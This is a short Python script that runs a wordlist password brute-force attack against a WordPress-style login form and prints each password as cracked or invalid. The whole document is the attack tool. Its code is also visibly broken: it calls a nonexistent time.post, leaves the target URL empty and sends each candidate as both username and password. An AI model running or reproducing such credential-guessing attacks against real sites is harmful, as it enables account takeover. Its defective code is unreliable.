
from time import sleep
import sys
import os

args = sys.argv

if len(args) == 2:
    worldlist = args[1]

    url = ''
    file = open(worldlist, 'r').readlines()
    os.system('clear')

    for passw in file:
        pas = passw.replace('\n','')
        http = time.post(url, data={'log':pas, 'user_pass':pas, 'submit':'wp-submit'})
        content = http.content

        if "b'LOGADO COM SUCESSO    !'" in str(content):
            print ('\n' + '\033[0;32m' + '[*] PASSWORD CRACKED: ' + '\033[0;32m' + f'{pas}' + '\033[0;37m' + '\n')
            break
        else:
            print ('\033[0;31m' + '[!!?] PASSWORD INVALID: ' + '\033[0;31m' + f'{pas}' + '\033[0;37m' + '\n')
            sleep(1)

else:
    print('ATIVE: python brute.py worldlist')